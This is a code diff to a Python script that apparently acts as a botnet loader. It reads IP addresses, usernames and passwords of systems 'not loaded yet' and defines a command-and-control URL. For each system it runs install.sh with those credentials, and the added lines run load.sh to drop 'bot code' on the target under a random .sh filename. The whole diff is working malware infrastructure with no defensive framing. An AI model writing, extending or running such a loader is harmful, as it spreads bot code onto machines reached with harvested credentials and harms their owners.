@@ -4,6 +4,8 @@ import pprint
 import os
 import time
 import logging 
+import string 
+import random
   
 #Create and configure logger 
 logging.basicConfig(filename="../../logs/loader.log", 
@@ -18,6 +20,11 @@ logger.setLevel(logging.DEBUG)
 #run this script every 10 seconds or so
 #get ip user password that are not loaded yet from db, currently from file
 cnc = "http://192.168.1.18:5000"
+
+def randomFileName(stringLength=10):
+    """Generate a random string of fixed length """
+    letters = string.ascii_lowercase
+    return (''.join(random.choice(letters) for i in range(stringLength)))+".sh"
 
 def execute(cmd):
     popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
@@ -80,6 +87,11 @@ def load(system):
     for line in execute(['sh', 'install.sh', system["username"],system["password"],system["ip"]]):
         logger.info("IN install.sh\t"+line.strip())
         
+    
+    logger.info("loading bot code...load.sh")
+    for line in execute(['sh', 'load.sh', system["username"],system["password"],system["ip"],randomFileName(10)]):
+        logger.info("IN load.sh\t"+line.strip())
+
     return os.path.abspath("debs/"+directoryName)
 
 
